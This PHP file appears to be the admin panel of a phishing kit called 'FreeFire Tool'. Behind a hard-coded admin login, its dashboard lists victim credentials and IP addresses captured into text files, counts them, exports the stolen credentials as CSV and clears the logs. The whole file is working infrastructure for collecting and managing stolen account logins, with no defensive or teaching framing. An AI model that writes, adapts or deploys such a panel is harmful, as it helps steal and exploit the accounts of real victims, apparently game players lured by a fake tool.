<?php
session_start();
ob_start();

// ==================== CONFIGURATION ====================
// CHANGE THESE CREDENTIALS FOR SECURITY
$admin_username = "admin";
$admin_password = "freefire2024";
// =======================================================

// Check if user is already logged in
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // User is logged in, show dashboard
    showDashboard();
} else {
    // Check login credentials if form is submitted
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        
        if ($username === $admin_username && $password === $admin_password) {
            $_SESSION['loggedin'] = true;
            $_SESSION['username'] = $username;
            showDashboard();
        } else {
            showLoginForm("Invalid username or password!");
        }
    } else {
        showLoginForm();
    }
}

function showLoginForm($error = "") {
    ob_end_clean();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login - FreeFire Tool</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                display: flex; justify-content: center; align-items: center;
                min-height: 100vh; padding: 20px;
            }
            .login-container {
                background: rgba(255,255,255,0.95);
                padding: 40px; border-radius: 15px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                width: 100%; max-width: 400px;
            }
            .logo { text-align: center; font-size: 2.5rem; margin-bottom: 20px; }
            h2 { text-align: center; margin-bottom: 30px; color: #333; }
            .input-group { margin-bottom: 20px; }
            label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
            input[type="text"], input[type="password"] {
                width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0;
                border-radius: 8px; font-size: 16px;
            }
            .login-btn {
                width: 100%; background: linear-gradient(135deg, #667eea, #764ba2);
                color: white; padding: 15px; border: none; border-radius: 8px;
                font-size: 16px; font-weight: 600; cursor: pointer;
            }
            .error { color: #e74c3c; text-align: center; margin-bottom: 15px; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">🔐</div>
            <h2>Admin Login</h2>
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="input-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="login-btn">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

function showDashboard() {
    // Read captured data
    $credentials = [];
    $ip_logs = [];
    
    if (file_exists('data/credentials.txt')) {
        $credentials = array_reverse(array_slice(file('data/credentials.txt'), -50)); // Last 50 entries
    }
    
    if (file_exists('data/ips.txt')) {
        $ip_logs = array_unique(file('data/ips.txt', FILE_IGNORE_NEW_LINES));
    }
    
    $total_credentials = count(file('data/credentials.txt', FILE_SKIP_EMPTY_LINES));
    $total_ips = count($ip_logs);
    
    ob_end_clean();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Dashboard - FreeFire Tool</title>
        <style>
            :root {
                --primary: #667eea; --danger: #e74c3c; --success: #2ecc71;
                --warning: #f39c12; --dark: #2c3e50; --light: #ecf0f1;
            }
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: #f5f6fa; color: #333;
            }
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white; padding: 20px 30px; display: flex;
                justify-content: space-between; align-items: center;
            }
            .stats-grid {
                display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px; padding: 20px;
            }
            .stat-card {
                background: white; padding: 25px; border-radius: 10px;
                text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }
            .stat-number { font-size: 2.5em; font-weight: bold; color: var(--primary); }
            .data-section {
                background: white; margin: 20px; padding: 25px;
                border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }
            .log-entry {
                background: var(--light); padding: 15px; margin: 10px 0;
                border-radius: 8px; border-left: 4px solid var(--primary);
                font-family: 'Courier New', monospace; font-size: 0.9em;
            }
            .btn {
                padding: 10px 20px; border: none; border-radius: 5px;
                cursor: pointer; margin: 5px; text-decoration: none;
                display: inline-block; color: white;
            }
            .btn-danger { background: var(--danger); }
            .btn-success { background: var(--success); }
            .action-bar { display: flex; gap: 15px; margin: 20px 0; flex-wrap: wrap; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔐 FreeFire Tool Admin Dashboard</h1>
            <a href="?logout=true" style="color: white;">Logout</a>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number"><?php echo $total_credentials; ?></div>
                <h3>Total Credentials</h3>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo $total_ips; ?></div>
                <h3>Unique IPs</h3>
            </div>
        </div>

        <div class="action-bar">
            <a href="?export=creds" class="btn btn-success">Export Credentials</a>
            <a href="?clear_logs=true" class="btn btn-danger" onclick="return confirm('Clear all logs?')">Clear Logs</a>
        </div>

        <div class="data-section">
            <h3>Recent Credentials</h3>
            <?php if (empty($credentials)): ?>
                <div class="log-entry">No credentials captured yet.</div>
            <?php else: ?>
                <?php foreach ($credentials as $cred): ?>
                    <div class="log-entry"><?php echo htmlspecialchars($cred); ?></div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>

        <?php
        // Handle logout
        if (isset($_GET['logout'])) {
            session_destroy();
            header('Location: admin.php');
            exit();
        }
        
        // Handle export
        if (isset($_GET['export'])) {
            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="credentials_export.csv"');
            if (file_exists('data/credentials.txt')) {
                readfile('data/credentials.txt');
            }
            exit();
        }
        
        // Handle clear logs
        if (isset($_GET['clear_logs'])) {
            file_put_contents('data/credentials.txt', '');
            file_put_contents('data/ips.txt', '');
            header('Location: admin.php');
            exit();
        }
        ?>
    </body>
    </html>
    <?php
    exit();
}
?>